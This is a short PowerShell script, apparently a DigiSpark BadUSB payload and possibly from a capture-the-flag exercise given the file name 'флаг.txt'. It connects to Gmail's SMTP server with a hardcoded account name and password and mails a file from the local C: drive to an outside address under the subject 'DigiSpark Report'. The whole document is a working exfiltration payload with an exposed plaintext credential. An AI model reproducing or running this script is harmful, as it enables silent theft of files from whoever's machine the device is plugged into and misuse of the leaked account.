chcp 1252;
$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); 
$SMTPInfo.EnableSsl = $true; 
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('digisparkbot', 'FB7knT5wBVdWNx9'); 
$ReportEmail = New-Object System.Net.Mail.MailMessage; 
$ReportEmail.From = 'digisparkbot@gmail.com'; 
$ReportEmail.To.Add('eniluxperx@gmail.com'); 
$ReportEmail.Subject = 'DigiSpark Report'; 
$ReportEmail.Body = 'hello'; 
$ReportEmail.Attachments.Add("C:\флаг.txt")
$SMTPInfo.Send($ReportEmail);
